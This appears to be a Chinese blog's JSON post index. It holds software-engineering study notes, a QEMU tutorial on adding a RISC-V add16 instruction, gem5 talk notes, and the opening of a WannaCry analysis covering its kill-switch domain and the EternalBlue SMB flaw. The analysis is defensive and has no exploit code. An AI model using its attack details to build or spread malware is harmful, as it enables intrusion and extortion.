软件维护: 改正性，适应性，完善性，预防性 生命周期模型瀑布模型*传统开发方法 最广泛，顺序性，依赖性 推迟写代码，每个阶段都写文档 缺点：用户参与少，静态 快速原型模型*看名 优点： 用户参与多了 缺点： 原型大概率抛弃 增量模型分为功能模块，逐步实现（开放架构） 螺旋模型瀑布+快速原型+风险分析 每阶段增加风险分析，降低风险 喷泉模型*迭代和无缝 总目标： 线性过程 迭代* 逐步求精，面向对象 敏捷敏捷宣言 个体+互动 &gt; 流程+工具 软件 &gt; 文档 客户合作 &gt; 合同谈判 相应变化 &gt; 遵循计划 增量 和 迭代系统由三个模块构成， 增量：一个个实现 。 迭代，实现三个垃圾模块，再一步步求精。 SCRUM*冲刺 Sprint ： 一个工作周期 产品订单： 项目的概要文档，以天为单位 冲刺订单 ： 小文档，以16小时为单位 燃尽图： to-do list 角色 产品拥有者 ： 甲方领导 利益相关者 ： 客户 专家 ： 技术总监 团队成员 ： 程序员 活动 计划会： 冲刺初制定计划 每日立会： 每天15分钟 评审会： 冲刺结束前 反思会/回顾会 ： 冲刺结束后 XP 于 SCRUM 区别 XP SCRUM 迭代长度 1-2周 3-4周 迭代中是否允许修改需求 yes no 迭代中是否按优先级实现 yes no 是否采用严格工程方法，保证进度质量 yes no DevOps自动化，高度依赖工具 需求分析用户 &amp; 系统 系统需求是对用户需求的细化和完善 系统需求的阅读对象是开发者，用户需求是客户 系统需求是用户需求的开始 目标 &amp; 涉众 涉众与目标系统相关的一切人和物 系统功能的确定正式和非正式的访谈 分析过程用例-&gt;规约用例并生成文档-&gt;活动图-&gt;文字功能性需求 三种功能性需求系统功能需求 + 交互需求 + 外部接口需求 需求说明书文档+涉众+目标+功能，非功能+交付物+验收标准+附件 需求跟踪业务，—–需求， 类模型 三者递归确定，互有对应 |————-| ———| - 活动图，需求文档，类图 提高完备性，同时检查是否有冗余（有没有缺的，多的） 软件架构基本元素构件 + 连接件 + 配置 数据流风格管道与过滤器： 信息隐藏，高内聚低耦合，可以灵活组合 层次系统 ：计算机网络 正交软件架构： 层 ： 一组具有相同抽象级别的构件 线索： 用例形成的调用关系 好处：每个需求变动仅影响某一条线索 客户机服务器架构: 一个服务器服务多个客户端 适应变化，灵活 易于对系统进行扩充和缩小 功能构建隔离 浏览器/服务器架构 : 基本同上+抽取client的function形成的web服务器 独立构建风格MVC架构* Model: 企业数据和业务规则 View：用户看到并与之交互的界面 Controller：根据输入调用模型和视图去完成用户的需求，不输出结果，不做任何处理 数据中心风格 - 仓库系统星型结构，中央数据库和周边client 黑板系统：中央数据库将状态通知client，由client决定选择 类的分析与设计迭代逐级细化 类的种类 实体类：存储，传递数据的类，名词 控制类：管理类，体现执行逻辑，动宾 边界类：外部用户交互，界面类，数据交换类 领域模型初始类图-实体类 实体类 &lt;&lt;entity&gt;&gt; 类名 ： 构造性 变量： 可见性 (private , public ..) - (-,+,_,~) 依赖（计算）属性，(/) 名字 ： 类型 ： UML定义的，int String… 下划线：表示静态 没有方法 类的关系* 关联关系 ： 静态，拥有，长期持久 导航方向 ： 箭头 ， 包含关系 依赖关系 ： 动态，临时 - 避免双向依赖 依赖 包含 关联 对象 对象名：类的类型 实例变量 = 初始值 对象名为空代表匿名对象，类名为空代表有上下文 管理类 &amp; 控制类 管理类 控制类 不考虑get，set方法 隔离边界与实体 对象 对于同类对象的协调和管理 不同类 层 Domain层 业务控制层 作用 创建对象，代理访问其他对象 一个用例一个 优化利用抽象类隔离变化 空三角箭头表示继承 枚举类 &lt;&lt;enumeration&gt;&gt;界面设计：对实体，生成 ProjectMask 代理类 CASE工具软件开发环境，计算机辅助软件工程 类的关系集合类型 是否要求顺序 是否要求唯一性 no yes Set no no Bag/Multiset yes yes OrderedSet yes no List/Sequence 适用模板类而非具体类 聚合 - 聚集部分与整体，共享 组合存在依赖性 - 同生共死 依赖访问的瞬时性 - 用参数 类的详细设计算法+数据结构+物理结构 其他设计+详细设计说明书+评审 什么是结构化的程序 盒图图例：不允许随意跳转 - 向里嵌套 PAD图问题分析图 - 向右嵌套 判定表使用“—”来表 示对此条件的不关心或不适用 判定树： 结点-选择，叶子-结果 PDL人话版的C语言 OCL ？再看看 设计优化smell僵化性，脆弱性，顽固性，粘滞性，复杂，重复，晦涩 重写 与父类方法有相似的行为，细节调整 相同条件工作，子类不应具有比其父类更严格的条件限制 - Liskov替换原则 重写的方法最高不能超出父类方法的状态。 循环依赖：提取接口 狎昵关系： 两个类过分亲密，高耦合 接口隔离原则：接口的稳定，适应变化，同一个类提取不同的接口 依赖倒置原则：依赖于抽象 开放封闭原则： 扩展开放，修改封闭 单一职责原则：单一功能 合成/聚合复用原则：尽量使用合成/聚合 形式的委托重用，尽量不使用继承重用 子类是父类的特殊类型 模式 架构模式： MVC，层次等 设计模式：抽象工程之类的 实现模式：具体到写代码，类名，变量名，函数名。。 创建模式 结构模式 行为模式 类 抽象工厂 适配器 观察者模式 类 单例 桥 - 装饰 策略模式 类 代理 状态 类 门面 抽象工厂模式工厂表示一组产品的打包，不同的工厂对应不同的组合 抽象工厂是一个接口，用于生成一组对象，实际对象根据类别又有自己的接口 低耦合，且添加新的更容易 单例模式管理类或控制类系统中只需要一个实例，该实例在程序中被创建 要求类的构造方法是私有的，有公有的方法获取该类的实例，实例变量为私有或受保护的。 适配器模式利用 适配器进行接口的转换 桥模式先将不同的变化维度（单一职责原则）分离，每个维度都有独立的抽象和继承结构，建立抽象耦合 装饰模式对于负数功能，若将其归入不同的变化维度太多了，归入装饰器 将Bridge中的抽象 和实现合二为一了，是其特殊形式 门面模式外部与一个子系统的通信必须通过一个统一的门面对象，且单例 代理模式中介，负责资源的中间处理，节省主体的时间 用来对有价值稀缺资源的管理，比如数据库的连接等，提高资源的利用率或系统性能 观察者模式MVC适用了观察者 当主题对象在状态上发生变化时，会通知所有观察者对象，使它们能够自动更新自己 策略模式将每一个算法封装到具有共同接口的独立的类中 灵活可以相互替换 状态模式使用一个具有多个子类的类，提前创建所有对应的子类，状态变化时换类 软件测试测试的通过并不能用来证明整个系统是正确的 测试V模型 + 测试* 测试名称 开发阶段 测试对象 测试方法 单元测试 实现 类测试 白盒测试 集成测试 系统设计 包或系统测试-交互 灰盒测试 系统测试 系统需求 构件和接口测试 黑盒测试 验收测试 客户需求 现场复现 黑盒测试 为什么要早修正 涉及的范围越来越广泛 曾经付出的成本越来越高 看一眼 P9 左下图 非功能测试峰值 ， 尖峰， 压力 ， 浸泡 软件度量McCabe + 控制流图边数 - 点数 + 2 = 分支结点+1 LCOM$$LCOM = \\frac{(\\frac 1 a \\sum_{j=1}^{a}\\mu(A_j))-m}{1-m}$$ m为方法数，a为所含的实例变量数， 为访问每个实例变量的方法数。 等价类测试 - 黑盒 数值：一般，一个有效，两个无效 其他： 一个有效，一个无效 传统 + 强等价类方法 边界值分析 ：对数值边界创建有效或无效等价类 控制流 的 覆盖测试 - 白盒 语句覆盖 - 结点 分支覆盖 - 边 条件覆盖 - 原子谓词真假 满足分支覆盖要求一定会满足语句覆盖要求 分支覆盖不能覆盖条件，因为条件是原子谓词判断，但对于组合条件可能会有诸如短路的情况 条件不能覆盖分支，因为是 2*原子谓词，可能有没覆盖到的情况 分支 ，条件 并不完全覆盖，综合一下 多条件组合覆盖 - 原子谓词及其组合覆盖 基本路径测试 - 独立路径 （ 独立路径要求在路径中至少含有一条未曾使用过的边） &lt;= V(G) 断言Junit可测试性 - 彼此依赖而需要 模拟程序 或 桩 设计简单方法 避免私有方法 优先使用通用方法 组合优于继承 避免隐藏的依赖关系与全局状态 人工测试审查 - 评审 - 走查 CMMI统一的，明确定义的组织级软件工程 初始级 - 已管理 - 已定义 - 已量化管理 - 优化 UML用例图注意同一个图中的用例在同一个抽象级别 角色 Actor人或软件系统，使用系统，与系统有关系 寻找用例自己理解吧 包含关系 &lt;&lt;include&gt;&gt;一些通用，共同基础过程的功能，避免重复实现 - 非逻辑分解 关键词： 依赖，包含 扩展关系 &lt;&lt;extend&gt;&gt;特殊情况，需要有条件 关键词：错误，特殊情况 活动图跨用例 图示 开始点 ：实心圆点 ， 结束点 ：实心加一圈 动作：圆角矩形 条件 ： 菱形 - 可省略 分支，汇聚： 粗横线， {and}，{or} 对象： 直角矩形 集合 ： 多个动作 （三叉戟） 如果动作具有多个汇聚的箭头，需要等待所有分支都完成 泳道按角色划分 基本事件流和备选利用中括号[] 围绕子活动或者进入备选事件流的条件，可以另用活动图描述 数据流图基本符号实体，处理，存储，流 画法看课件 包图大包 嵌套 小包，小包 嵌套 类 $$ \\oplus $$ : 嵌套关系 虚线：层间的使用(依赖)关系 实线：包间的使用(依赖)关系 空心三角： 继承 避免循环依赖 类图领域模型实体类 &lt;&lt;entity&gt;&gt; 类名 ： 构造性 变量： 可见性 (private , public ..) - (-,+,_,~) 依赖（计算）属性，(/) 名字 ： 类型 ： UML定义的，int String… 下划线：表示静态 方法： 同上 参数三种类型 ： in ， out ,inout 没有方法 关联类描述两个对象之间的联系 顺序图表示一个用例，同步调用的方式（阻塞） 控制焦点 ： 长方形 生命线: 竖虚线 同步消息：实心三角箭头 （左右都可以） 返回消息： 虚线左箭头 异步消息： 创建对象 ， 虚线右箭头 不会，找我，给图 结构： 方括号 condition 可选 ： opt - 有条件执行的动作，不满足条件就不执行 多分支 alt - 不同的条件执行不同的同坐 循环 loop(start,end,condition) 通信图可嵌套，或用编号.编号表示嵌套级别 其他与顺序图类似 状态图唯一的开始状态，可以有多个结束状态，针对确定性行为 转台框中的三个状态 ： Entry - Do - Exit 状态转换 - 过渡事件+[条件]+动作 在事件被触发并且满足某个特定条件的情况下才会进行 动作：entry 执行前，未进入状态时做的动作 层次化组织 ： 框起来 分解 ： 分解为互不依赖的子状态 - 子状态离开 并行： 有两个输入，则都完成才会被触发 体系结构风格模块从低到高排序 内聚程度：内部各个元素彼此结合的紧密程度 - 越高，模块独立性越强 偶然内聚、逻辑内聚、时间内聚、通信内聚、顺序内聚及功能内聚。 耦合程度：模块之间互相连接的紧密程度 - 越低，模块独立性越强 非直接 &lt; 数据＜标记＜控制&lt; 外部＜公共＜内容 4+1 视图模型用例在中间，四周是逻辑视图（功能需求），开发试图（软件模块），进程视图（并发），物理视图（硬件）","link":"","tags":[{"name":"软件工程","slug":"软件工程","permalink":"https://dingiso.github.io/tags/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B/"}]},{"title":"Question","date":"2021-03-07T12:07:05.000Z","path":"2021/03/07/Question/","text":"本文主要是用于询问软件工程问题 问题老师我想问一下课后题的 11.2 老师您上课给的答案如下 我对于 4 结点与 9 结点有点问题，4 结点我认为应该是两个结点，9结点在代码上没有实际的代码行对应 我做的结果详细的是下图 回答控制流图应该尽量简洁，便于计算环形复杂度，顺序结构能合并的应该尽量合并，同时需要注意的是这样的合并并不会改变环形复杂度 4 结点是 合并后的结果 - 结点数 - 1 ，边 - 1 不影响环形复杂度 9 结点是 为了画图更清晰 - 结点数 + 1 ，边 + 1 不影响环形复杂度 更改的图例如下","link":"","tags":[{"name":"Question","slug":"Question","permalink":"https://dingiso.github.io/tags/Question/"}]},{"title":"在QEMU中定制RISCV指令并测试","date":"2021-02-13T04:05:34.000Z","path":"2021/02/13/在QEMU中定制RISCV指令并测试/","text":"本文主要是介绍 通过QEMU中提供的Decode Tree 的方法定义指令编码 定义指令的转义和指令的基础逻辑 利用二进制的方式定义测试程序并测试 使用 P扩展(Packed SIMD) 作为示例 QEMU 下载为了更改QEMU的源码，我们需要正确下载源代码并自行进行编译，QEMU提供了两种方式方便我们下载。 通过 git 的方式下载 QEMU 的最新源码 - 该方式可能需要一个稳定的 “科学的” 网络 1234git clone https://gitlab.com/qemu-project/qemu.gitcd qemugit submodule initgit submodule update --recursive 同样的，我们可以直接选择下载官网打包好的最新稳定版的QEMU源码，这能让你更稳定，快速的得到代码，但可能不是 git 同步的最新版本 - QEMU-5.2.0 123wget https://download.qemu.org/qemu-5.2.0.tar.xztar xvJf qemu-5.2.0.tar.xzcd qemu-5.2.0 通过以上方式下载过后，我们可以开始进行指令的添加了 指令编码 - Decode Tree为了方便开发者和编译检查，QEMU 中的指令的二进制指令编码都是以Decode Tree 方式进行定义的，QEMU的内部程序在编译时会将其自动解析为 c 语言。 特别地，像 RISC-V 这种拥有固定指令格式的 ISA 特别契合 Decode Tree。因为各个指令段都在固定的位置。各个段的重复性要高很多，足以节省很多代码空间 下面我们已一种最常用的三参数指令的P扩展add16作为例子： 1234#！target/riscv/insn*.decode# 31:25 24:20 19:15 14:12 11:7 6:0add16 0100000 ..... ..... 000 ..... 1110111 @r# funct7 Rs2 Rs1 funct3 Rd opcode 12345678# 其中用到的各个定义如下# Formats 32:@r ....... ..... ..... ... ..... ....... &amp;r %rs2 %rs1 %rd# Fields:%rs2 20:5%rs1 15:5%rd 7:5 一个指令的定义有以下几个过程 找到官方文件对于指令编码的定义，将指令名称add16和二进制编码0100000 ..... ..... 000 ..... 1110111填入 通过指令对于参数的定义，选取合适的Format，例如 @r ，就顺序包含了两个输入寄存器rs1 &amp; rs2 和输出寄存器rd 如果没有，就需要自己定义 有关decoder tree 的具体内容，接下来的博客可能会进行阐述， 但是有的 blogs 已经有了详细的阐述，qemu 官方也有，下面给出链接，大家可以参阅 QEMU官方： Decode Tree的定义 其他博客的定义：Part-1，Part-2 指令转译 - transQEMU在执行时，会将 target instructions(e.g. RISC-V instructions) 转译成 TCG ops，而TCG ops则会再转译为host instructions(e.g. x86 instruction)。而trans_add16() 实际执行了 add16 指令对应的 TCG ops 12345#！ QEMU dynamic instructions translation+---------------------+ +---------+ +-------------------+| Target Instructions | ---&gt; | TCG ops | ---&gt; | Host instructions |+---------------------+ +---------+ +-------------------+ (e.g. RISC-V) (e.g. x86) 关于 TCG 的说明，可以参考 QEMU 的 documentations Translator Internals，TCG Readme 为了方便定义和区分，新建一个文件./target/riscv/insn_trans/trans_rvp.inc.c来定义P Extension指令的trans_xx()函数 1234567891011121314151617#！ ./target/riscv/insn_trans/trans_rvb.c.inc/* * RISC-V translation routines for the RVP Standard Extension. */static bool trans_add16(DisasContext *ctx, arg_pcnt *a) &#123; if (a-&gt;rd != 0) &#123; TCGv t0 = tcg_temp_new(); gen_get_gpr(t0, a-&gt;rs1); TCGv t1 = tcg_temp_new(); gen_get_gpr(t1, a-&gt;rs2); gen_helper_add16(cpu_gpr[a-&gt;rd], t0, t1); tcg_temp_free(t0); tcg_temp_free(t1); &#125; return true;&#125; 由于对x0(zero register)的写入都会被忽略，因此首先判断rd是否为0，若为0则不做任何事情 接着声明两个TCG variable：t0和t1，利用gen_get_gpr()将rs1,rs2寄存器的值存入变量 利用新声明的变量调用gen_helper_add16()函数转向helper function，该函数计算完成后，会将结果保存在rd(i.e. cpu_gpr[a-&gt;rd])寄存器中。 P.S. 其实这里可以简单的直接将cpu_gpr[a-&gt;rs1]传入，省略TCG variable: t0,t1 的声明： 1234567891011#! ./target/riscv/insn_trans/trans_rvp.c.inc/* * RISC-V translation routines for the RVB Standard Extension. */static bool trans_add16(DisasContext *ctx, arg_pcnt *a) &#123; if (a-&gt;rd != 0) &#123; gen_helper_add16(cpu_gpr[a-&gt;rd], cpu_gpr[a-&gt;rs1], cpu_gpr[a-&gt;rs2]); &#125; return true;&#125; 指令的逻辑 - helper function123#define DEF_HELPER_2(name, ret, t1, t2) \\ DEF_HELPER_FLAGS_2(name, 0, ret, t1, t2)//DEF_HELPER_FLAGS_2(name,flag,ret,t1,t2) 为了方便QEMU对于helper function的调用和定义，我们需要定义一个函数DEF_HELPER_x = DEF_HELPER_FLAGS_x 对QEMU声明函数的名称和参数, x代表该指令需要的参数-(自变量），不带 _FLAGS 的函数会利用命令自动将 FLAGS参数置为0。 name ：指令的名称，连接成 HELPER(name) / helper_name 的形式作为 helper function flag : 函数权限位，TCG调用的权限，全局不读/写，返回值无用，无返回值。tcg.h ret : helper function返回值 t1- tn ：helper function的参数 ret 和 t1-tn 的类型可以是， 类型 意义 tl target_ulong - QEMU中保存寄存器值得基本单位 env environment - CPUXXSTATE 保存CPU状态寄存器的值 i64 integer-64 - 64位整型可用于浮点数指令 add16的 helper function 定义如下: 1234#! ./target/riscv/helper.h/* Packed-SIMD Extension */DEF_HELPER_2(add16, tl, tl, tl)DEF_HELPER_FLAGS_3(add16, 0, tl, tl, tl) 两种定义意义相同 1234567891011121314151617181920212223242526272829#! ./target/riscv/bitmanip_helper.c/* * RISC-V P Extension Helpers for QEMU. */#include &quot;qemu/osdep.h&quot;#include &quot;cpu.h&quot;#include &quot;exec/exec-all.h&quot;#include &quot;exec/helper-proto.h&quot;#define u16p uint16_t *#if defined(TARGET_RISCV32)const uint32_t LC_16BIT = 2;#elseconst uint32_t LC_16BIT = 4;#endif// target_ulong HELPER(add16)(target_ulong rs1, target_ulong rs2) target_ulong helper_add16 (target_ulong rs1, target_ulong rs2) &#123; target_ulong rd = 0; u16p rs1_p = (u16p)&amp;rs1; u16p rs2_p = (u16p)&amp;rs2; u16p rd_p = (u16p)&amp;rd; for (unsigned i = 0; i &lt; LC_16BIT; i++) rd_p[i] = rs1_p[i] + rs2_p[i]; return rd;&#125; 该函数就是add16的实际逻辑函数，helper function 接受两个 target_ulong 类型的 rs1&amp;rs2, 并将结果返回，存储在 rd 寄存器 add16 指令的内容，是将寄存器分为多个16位数并分别计算，因此我们将rs1/2 变为16位的数组(指针)并分别进行加法运算，得到结果然后返回。 补充为了使指令成功执行，我们还需要填写以下代码 12345#! ./target/riscv/meson.buildriscv_ss.add(files( &#x27;psimd_helper.c&#x27;,)) 1234#! ./target/riscv/translate.c/* Include insn module translation function */#include &quot;insn_trans/trans_rvp.c.inc&quot; 指令的测试在我们了解了指令的添加流程后，我们要对添加后的指令进行测试以确保指令的正确性。 为了成功编译，你需要事先安装riscv64-unknown-elf-gcc来编译测试程序，你可以通过 riscv-gnu-toolchain 进行编译安装 下面我将介绍一下QEMU的编译过程，鉴于我们只需要QEMU的用户态测试程序，我们执行以下命令在你保存qemu的文件夹下： 1234mkdir buildcd build../configure --target-list=riscv64-linux-usermake build 文件夹用于保存你的编译结果，你也可以自由选择想要保存的文件夹。 接着我们创建一个 p_test 文件夹保存测试程序并进行测试, 因为原有的工具链并不含有新添加的指令，没办法编译成合适的二进制编码，所以我们使用内联汇编为其提供二进制编码，省去更改工具链的麻烦。 123456789101112131415161718192021#! ./build/p_test/add16.c#include&lt;stdio.h&gt;__attribute__((noinline))int mac_asm(int a,int b,int c) &#123; asm __volatile__ (&quot;.word 0x40c58577\\n&quot;); asm __volatile__ (&quot;mv %0,a0\\n&quot; : &quot;=r&quot;(a) : :); printf(&quot;a=%d\\n&quot;,a); return a;&#125;int main()&#123; int a=5,b=0xFFFEFFFF,c=0xFFFEFFFF; printf(&quot;add16:=0x%x\\n add:=0x%x\\n&quot;,mac_asm(a,b,c),b+c); return 0;&#125; RISC-V 会将函数的参数放入 a0-a7 寄存器中，并将 a0 寄存器中的值返回 a0-a7 对应 x10-x17 和二进制编码 10-17 ， 因此最后的指令编码如下 12345678910111213# Encoding used for &quot;add16 a0, a1, a2&quot;0x40c58577 [base 16]==# Group by related bit chunks:0100000 01100 01011 000 01010 1110111 [base 2]^ ^ ^ ^ ^ ^| | | | | || | | | | opcode (6..2=0x1D 1..0=3)| | | | dest (10 : a0)| | | funct3 (14..12=0)| | src1 (11 : a1)| src2 (12 : a2)funct7 (31..25=0x40) 为了防止在编译过程中，编译器会对寄存器进行优化，将返回值存入其他寄存器，我们使用 mv 指令强制将变量 a 的值赋给 a0 寄存器,这样就能成功将值返回。 12riscv64-unknown-elf-gcc -o x x.c../qemu-riscv64 xx 我们利用以上指令执行，返回正确的结果 12add16:=0xfffcfffe add:=0xfffdfffe add16 由于每16位进行计算，所以无后16位的进位，中间位是c，而add由于有进位，所以是d 在QEMU中定制指令的流程大致如同本文的介绍，但是由于 add16 仅涉及数值的计算，而没有像 csr 相关指令涉及 CPURISCVState 的更新，以及像jal指令涉及DisasContext的判断，因此相对简单，对于其他指令，需要在好好的研究以下 Refrences: QEMU-使用 Decodetree新增 RISC-V 指令 RISC-V: custom instruction and its simulation riscv-p-spec 感谢在学习过程中，老师们的指导，非常感谢！！","link":"","tags":[{"name":"QEMU","slug":"QEMU","permalink":"https://dingiso.github.io/tags/QEMU/"},{"name":"RISC-V","slug":"RISC-V","permalink":"https://dingiso.github.io/tags/RISC-V/"},{"name":"sim","slug":"sim","permalink":"https://dingiso.github.io/tags/sim/"}]},{"title":"Up to Date","date":"2021-02-01T08:06:43.407Z","path":"2021/02/01/hello-world/","text":"Welcome to my blog !在这里我将分享一些技术细节和相关过程，不断更新中 欢迎来我的博客 - 建设程度 10/100","link":"","tags":[]},{"title":"Gem5 演讲稿","date":"2021-01-13T00:05:34.000Z","path":"2021/01/13/Gem5 演讲稿/","text":"本文是 gem5 视频搭配的演讲稿的部分内容视频地址 slides地址 Gem5 演讲稿Atomic 计时-计时访问是最详细的访问。它们反映了我们为实现实际时间所做的最大努力，并包括排队延迟和资源争用的建模。一旦在将来的某个时间点成功发送了计时请求，则发送请求的设备将无法获得响应，或者如果无法完成请求，则将获得NACK（以下更多内容）。定时和原子访问不能在内存系统中共存。 原子访问-原子访问比详细访问要快。它们用于快速转发和预热缓存，并返回大约时间来完成请求，而不会引起任何资源争用或排队延迟。发送原子访问后，将在函数返回时提供响应。原子和定时访问不能在内存系统中共存。 功能性-与原子性访问一样，功能性访问是瞬间发生的，但是与原子性访问不同，它们可以与原子性或定时访问共存于存储系统中。功能性访问用于诸如加载二进制文件，检查/更改模拟系统中的变量以及允许将远程调试器附加到模拟器之类的事情。重要说明是设备接收到功能访问时，如果它包含一个数据包队列，则必须在所有数据包中搜索该功能访问正在执行的请求或响应，并且必须对其进行适当更新。该Packet::intersect()和fixPacket()方法可以帮助这一点。 O3 CpuFetch：在每个周期获取指令，并根据所选策略选择要从哪个线程获取信息。在此阶段，首先创建DynInst。还处理分支预测。 Decode: 处理PC相关的无条件分支的处理 Rename：利用PR File,两种情况会终止： 没有足够寄存器来重命名，后续资源已经用完(序列化指令 ) IEW ： 将指令分派给指令队列，告诉指令队列发出指令，执行并写回指令 Commit: 处理指令可能引起的任何故障。还可以在分支预测错误的情况下处理重定向前端。 E in E : 最后执行存在潜在的错误，这些错误不会在程序结果中显示。其次，通过在流水线的开始执行，指令全部按顺序执行，那么乱序的load interaction负载交互会丢失。我们的模型能够避免这些因流水线设计产生的不足并提供准确的时序模型。 Template Policy: 利用模板来实现多态性，主要是利用 Impl 定义类，优点是不需要传统虚拟函数/基类。主要缺点是必须在编译时完全定义CPU，并且模板化的类需要手动实例化。 ISA 独立性： 将代码分为 与 ISA 无关和ISA有关的代码，提高复用性 分支预测：分支是错误时，通知 commit stage 压缩ROB内不用的代码 CLassic Memory SystemMOESI: 数据一致性协议 Owned 状态省一次读 express snoops: 原子的，能瞬间返回，在时序模式也可以使用，防止泛洪 cache： 内存映射数据包和侦听数据包。内存映射的请求在内存层次结构中向下，而响应在内存层次结构中向上（相同的路由返回）。侦听请求在缓存层次结构中沿水平方向移动，侦听响应在层次结构中沿水平方向向下（相同的路由返回）。普通监听在水平方向上运行，而快速监听则在缓存层次结构中。 RubySLICC : 代表用于实现缓存一致性的规范语言。本质上，缓存一致性协议的行为类似于状态机。SLICC用于指定状态机的行为。并可施加某种约束。例如，SLICC可以限制单个循环中可能发生的转换数量。除了协议规范外，SLICC还将内存模型中的某些组件组合在一起。如下图所示，状态机从互连网络的输入端口获取输入，并在网络的输出端口将输出排队，从而将缓存/内存控制器与互连网络本身连接在一起。 sequencer： Sequencer类负责向处理器子系统（包括缓存和片外内存）提供来自处理器的加载/存储/原子内存请求。当每个内存请求由内存子系统完成时，也会通过定序器将响应发送回处理器。系统中模拟的每个硬件线程（或内核）都有一个定序器 Replacement Policies： LRU 和 Pseudo-LRU TOPAZ -该模拟器已准备好在gem5中运行，并在原始的ruby网络模拟器上添加了大量功能。","link":"","tags":[{"name":"sim","slug":"sim","permalink":"https://dingiso.github.io/tags/sim/"},{"name":"gem5","slug":"gem5","permalink":"https://dingiso.github.io/tags/gem5/"},{"name":"risc-v","slug":"risc-v","permalink":"https://dingiso.github.io/tags/risc-v/"}]},{"title":"WannaCry 的具体的细节的分析","date":"2020-12-30T00:05:34.000Z","path":"2020/12/30/Wannacry 病毒分析/","text":"本文是针对WannaCry 的具体的细节的分析 REFERENCE WannaCry 病毒分析Virus Analysis Of WannaCry[TOC] ###引 言 本次大作业主要对WannaCry病毒的行为和具体代码的实现逻辑进行分析，之前有一些前辈已经对病毒大体情况做出了相关的分析。本次大作业将会利用现有能找到的前人的所有分析进行汇总细化，并结合至今为止病毒的变种情况，进行针对事实与现金情况的逻辑，变种和防范方法分析，通过依照事实的分析，解答大家对病毒的疑问和误解 本次大作业的亮点在于： 通过了病毒发作到现在的沉淀，病毒的具体行为和变种也经过了发展和沉淀，通过综合能得到更适合现在的方法 通过对病毒变种的分析，分析病毒的演变情况，了解病毒在发作之后可能会有什么样的改变 通过基于事实的推测，推翻大众对病毒误解，对病毒有基于科学的认识。 ##1 病毒概况 2017年5月12日，本文所分析的勒索病毒WannaCry借助高危漏洞”永恒之蓝”（EternalBlue）在全世界范围内快速传播。世界范围内的很多国家，包括俄罗斯、西班牙、意大利、越南、美国、英国、中国、等百余个国家的企业和医院等机构收到大幅度的破环。与此同时，我国的许多行业机构和大型企业也被攻击，有的单位甚至”全军覆没”，造成了近期罕见的损失。 本报告将从传播途径、危害方式和结果、受威胁用户群等角度，逐一厘清这个恶性病毒方方面面的真相，用以帮助大家认识、解决该病毒，防范未来可能出现的变种病毒，同时澄清一些谣传和谎言。 1.1 病毒攻击行为及危害遭受WannaCry病毒侵害的电脑，其文件将被加密锁死，病毒开发者提供了一个比特币账号供支付赎金打开锁死的文件，但根据病毒源码的分析，受害者可能永远的失去了这些文件。WannaCry病毒的设计就明确的表明了病毒和病毒作者不能得知受害者是否支付的了赎金，且病毒并不包含用于解码的神奇数，所以即使支付了赎金，大概率也不能得到恢复密钥 网上流传的”解密方法”只是”文件恢复工具”，可以恢复一些被删除的文件，但是作用有限。这是因为据病毒源码分析，文件的加密过程是加密后再删除原始文件，文件恢复工具可能可以恢复删除的原始文件。但是病毒对于文件的操作是十分频繁的，删除文件所保存的数据块可能会被覆盖，而且随着病毒执行时间的增加，恢复的可能性会逐渐降低。 1.2 传播途径和攻击方式WannaCry由蠕虫+勒索病毒构成，蠕虫传播和释放自己，后者负责加密文件。 蠕虫：蠕虫病毒是一种常见的计算机病毒。通过网络和电子邮件进行传播，具有自我复制和传播迅速等特点。此次病毒制造者正是利用了美国国家安全局(NSA)泄漏的WindowsSMB远程漏洞利用工具”永恒之蓝”来进行传播的。据悉，蠕虫代码运行后先会连接域名：hxxp: //www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com如果该域名可以成功连接，则直接停止。而如果上述域名无法访问，则会安装病毒服务，在局域网与外网进行传播。 但是无论这个”神奇开关”是否开启，该病毒都会攻击用户，锁死文件。另外，这个开关程序很容易被病毒制造者去除，因此未来可能出现没有开关的变种病毒。 1.3 易受攻击用户群大型企业和公共设施占收到攻击的主机的大多数，个人用户受攻击较少。接下来，将从两个方面说明易受攻击用户群的特点 操作系统：首先，该病毒只攻击Windows系统的电脑，几乎所有的Windows系统如果没有打补丁，都会被攻击。而WindowsVista、Windows Server 2008、Windows 7、Windows Server 2008 R2、Windows8.1、Windows Server 2012、Windows Server 2012 R2、Windows Server 2016版本，用户如果开启了自动更新或安装了对应的更新补丁，可以抵御该病毒。Windows10是最安全的，由于其系统是默认开启自动更新的，所以不会受该病毒影响。同时，Unix、Linux、Android等操作系统，也不会受到攻击。 网络结构：目前这个病毒通过共享端口传播同时在公网及内网进行传播，直接暴露在公网上且没有安装相应操作系统补丁的计算机有极大风险会被感染，而通过路由拨号的个人和企业用户，则不会受到来自公网的直接攻击 #2 永恒之蓝漏洞 2.1 漏洞情况说明2.1.1 漏洞简介永恒之蓝漏洞是一种利用Windows系统的SMB协议漏洞来获取系统的最高权限，以此来控制被入侵的计算机的系统漏洞 漏洞代码： MS17-010 2.1.2 漏洞影响2017年4月14日晚，影子经纪人黑客组织将永恒之蓝漏洞在互联网上公开后。在之后的五个月中，该漏洞被多款恶意软件利用。包括WannaCry，无文件的勒索软件UIWIX和SMB蠕虫EternalRocks。 EternalBlue(在微软的MS17-010中被修复)是在Windows的SMB服务处理SMBv1请求时发生的漏洞，这个漏洞导致攻击者在目标系统上可以执行任意代码。 2.2 SMB协议2.2.1 简介SMB（全称是Server MessageBlock）是一个协议服务器信息块，它是一种客户机/服务器、请求/响应协议，通过SMB协议可以在计算机间共享文件、打印机、命名管道等资源，电脑上的网上邻居就是靠SMB实现的；SMB协议工作在应用层和会话层，可以用在TCP/IP协议之上，SMB使用TCP139端口和TCP445端口。 2.2.2 工作原理（1）：首先客户端发送一个SMB negport请求数据报，，并列出它所支持的所有SMB的协议版本。服务器收到请求消息后响应请求，并列出希望使用的SMB协议版本。如果没有可以使用的协议版本则返回0XFFFFH，结束通信。 （2）：协议确定后，客户端进程向服务器发起一个用户或共享的认证，这个过程是通过发送SessetupX请求数据包实现的。客户端发送一对用户名和密码或一个简单密码到服务器，然后通过服务器发送一个SessetupX应答数据包来允许或拒绝本次连接 （3）：当客户端和服务器完成了磋商和认证之后，它会发送一个Tcon或TconXSMB数据报并列出它想访问的网络资源的名称，之后会发送一个TconX应答数据报以表示此次连接是否接收或拒绝。 （4）：连接到相应资源后，SMB客户端就能够通过openSMB打开一个文件，通过read SMB读取文件，通过write SMB写入文件，通过closeSMB关闭文件。 2.3 溢出分析2.3.1 概述漏洞出现在Windows SMB 